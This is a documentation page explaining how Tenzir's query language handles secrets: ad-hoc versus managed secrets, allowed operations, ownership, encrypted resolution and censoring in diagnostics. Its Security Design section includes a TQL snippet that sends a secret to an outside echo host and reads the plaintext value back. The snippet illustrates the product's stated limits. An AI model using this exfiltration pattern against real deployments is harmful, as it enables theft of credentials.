---
title: "Secrets"
canonical: https://tenzir.com/docs/explanations/secrets
source: https://tenzir.com/docs/explanations/secrets.md
section: "Docs"
---

# Secrets

> Operators and functions accept secrets as arguments for sensitive values, such as authentication tokens, passwords, keys, or even URLs.

Operators and functions accept secrets as arguments for sensitive values, such as authentication tokens, passwords, keys, or even URLs.

Security Design

Secrets protect against *accidentally* compromising the secret value. Assume that anyone with access to a workspace can obtain the true value.

Read more in the [Security Design](secrets.md#security-design) section.

## Usage in TQL

You can use secret values only with operators and functions that accept secrets. They generally do not document that they accept a secret, but they will accept secrets where appropriate.

You have two ways to pass an argument to an operator that expects a secret. The following examples use the [`to_splunk`](../reference/operators/to_splunk.md) operator, which expects a HEC-token for authentication:

* Provide a plain `string` ([Ad-hoc Secret](secrets.md#ad-hoc-secrets)):

  ```tql
  to_splunk "https://localhost:8088", hec_token="my-plaintext-token"
  ```

  This creates a “secret” containing the string literal `my-plaintext-token`.

* Use the [`secret`](../reference/functions/secret.md) function ([Managed Secret](secrets.md#managed-secrets)):

  ```tql
  to_splunk "https://localhost:8088", hec_token=secret("splunk-hec-token")
  ```

  The operator fetches the secret named `splunk-hec-token` to authenticate with the Splunk endpoint.

Functions take secrets the same way. For example, the [`hmac`](../reference/functions/hmac.md) function signs a value with a key that never appears in the pipeline:

```tql
digest = hmac(message, secret("hmac-key"))
```

## The `secret` type

Tenzir’s [type system](../reference/types.md) includes secrets as a special type. You can access secrets only with the [`secret`](../reference/functions/secret.md) function.

### Internals

A value of type `secret` holds the actual secret value. Tenzir restricts which operations can use it to prevent disclosure:

* Resolution: Tenzir resolves every `secret` call once, when it prepares the expression that contains it and before the first event arrives. The name must therefore be a constant, such as `secret("api-key")`, and cannot come from a field of an event. For ad-hoc secrets created from a constant string or blob, the value is the constant itself, so no lookup occurs.
* Memory: Tenzir keeps the secret value in memory that it wipes once it no longer needs the value.
* Operations: Format strings, concatenation, and encoding functions that receive a secret return another secret, as the next section describes. No operation converts a secret into a plain value of another type.
* Comparisons: Comparison operators reject secrets. Sorting, hashing, and deduplication treat all secrets as equal, so their results reveal nothing about the values.
* Events: Secrets live only within expressions and never in events. When you assign a secret to a field, Tenzir stores the string `"***"` instead and emits a warning.

Assigning a secret to a field stores a censored value:

```tql
from {}
key = secret("api-key")
```

```tql
{
  key: "***",
}
```

Tenzir warns that secrets cannot be stored in events and suggests passing the secret directly to the function or operator that uses it.

### Supported Operations

#### Format Strings

You can use secrets in [format strings](../reference/expressions.md#format-strings-f-strings). Unlike other types, which create strings with values formatted as if using the `string` function, a format string containing a secret yields a secret.

Use format strings when you combine secrets with other values:

```tql
let $auth = f"Bearer {secret("my-secret")}"
let $url = f"{$base_url}{secret("user-name")}:{secret("password")}"
```

Format strings turn secrets nested in a structured value (`record`, `list`) into the string `"***"`.

#### Concatenation

You can concatenate secrets with other secrets or strings using the `+` operator, but prefer format strings for assembled headers, URLs, and other text.

#### Encoding & Decoding

In general, Tenzir does not assume that a secret is valid UTF-8, although most operators make that constraint. Conversely, the platform stores secrets as text, while some operators expect a binary or otherwise encoded secret.

To bridge this gap, you can use Tenzir’s [encoding](../reference/functions.md#encoding) and [decoding](../reference/functions.md#decoding) functions:

```tql
let $binary_secret = secret("my-encoded-secret").decode_base64()
```

You can also encode (or decode) the result of a concatenation or format string, which is useful for some APIs:

```tql
let $headers = {
  auth: f"{secret("user")}:{secret("password")}".encode_base64()
}
```

#### Turning Secrets into Strings

You cannot turn a secret into a string. Any such attempt produces the string `"***"`.

#### Python

Since secrets cannot be stored in events, they never reach the [`python`](../reference/operators/python.md) operator. A field that held a secret contains the string `"***"` by the time the event arrives there.

## Ad-hoc Secrets

**Ad-hoc secrets** are secrets implicitly created from a `string` within [TQL](language.md). This happens when you provide a `string` to an operator or function that expects a `secret`. Operators and functions also accept a constant `blob`, which suits binary keys, such as `key=decode_hex("000102030405060708090a0b0c0d0e0f")`.

Plain string values are useful when developing pipelines and you don’t want to create a managed secret. This approach also works well for arguments that you don’t consider sensitive.

However, secrets created from plain values do not enjoy the same security as managed secrets. Their value appears directly in the TQL pipeline definition, as well as in the compiled and executed representation. A configured pipeline keeps the value in the configuration repository and its history, and the deployment stores it with the pipeline.

## Managed Secrets

**Managed secrets** live in the [platform](platform.md), which stores them encrypted. Each one has a name and belongs to an organization, a workspace, or a deployment. Manage them on the Secrets page of the app or through the platform API, and access a managed secret’s value with the [`secret`](../reference/functions/secret.md) function.

The configuration repository holds no secrets, so pipelines and packages refer to managed secrets only by name.

### Owners and Readers

The owner of a secret decides which deployments may read it:

* An **organization** secret is readable by every workspace and deployment of the organization, or only by the workspaces and deployments you pick.
* A **workspace** secret is readable by every deployment in the workspace, or only by the deployments you pick.
* A **deployment** secret is readable only by that deployment.

When several secrets that a deployment may read share a name, the closest owner wins: the deployment’s own secret, then its workspace’s, then its organization’s. This lets you set a value for the whole organization and override it for one workspace or deployment. The roles of the organization decide who may list and change the secrets of each owner.

### Resolution

A deployment looks up a secret’s actual value when it prepares the expression that uses it, by asking the platform over its connection. The platform answers with the secret that wins for this deployment. The value is encrypted using [ECIES](https://en.wikipedia.org/wiki/Integrated_Encryption_Scheme) with a one-time, per-secret key, and it remains encrypted throughout the transfer until it reaches the deployment.

The deployment caches a resolved value for 15 minutes after its first use. A changed value therefore reaches a pipeline that starts once the cache has dropped the old one, while a running pipeline keeps the value it resolved.

Because the values come from the platform, a pipeline that starts while the platform is unreachable cannot resolve its managed secrets. A deployment that **buffers secrets** avoids this: the platform seals every secret the deployment may read into the configuration it delivers, with a key that only the deployment holds, so its pipelines start without the platform. Turn it on with `tenzir deployment resilience enable`. A pipeline that uses a buffered secret restarts when the secret’s value changes.

## Security Design

Secrets protect against *accidentally* compromising the secret value by revealing it in a log file, showing it in a UI element, or committing it to a code repository as part of a pipeline.

However, anyone with access to a workspace can access secret values if sufficiently motivated.

For example, you could use a simple HTTP API that echoes requests to extract secret values:

```tql
from_http "echo.api.com",
  headers = { leaked: secret("key") },
  metadata_field=metadata
select metadata.headers.leaked
```

```tql
{ leaked: "secret-value" }
```

### Secrets in Diagnostics

Tenzir takes care not to leak managed secrets in diagnostic messages. However, many integrations rely on third-party libraries. Those libraries may produce error messages outside of Tenzir’s control that get forwarded to help you understand an issue.

As a remedy, an operator censors the values of managed secrets it has used in all diagnostics. Only the full value is censored, not parts of it. This means that a third-party diagnostic forwarded to you may still contain part of a secret value.

Use smaller secrets

Keep your managed secrets to the logical unit that is a secret, and use multiple secrets instead of one big one.

For example, an S3 URI may contain multiple keys that should be kept as separate secrets, instead of a single one:

```tql
let $url = f"s3://{secret("access-key")}:{secret("secret-key")}@bucket/path/to/file"
```

## See also

* [Platform](platform.md)
* [Deployment](deployment.md)
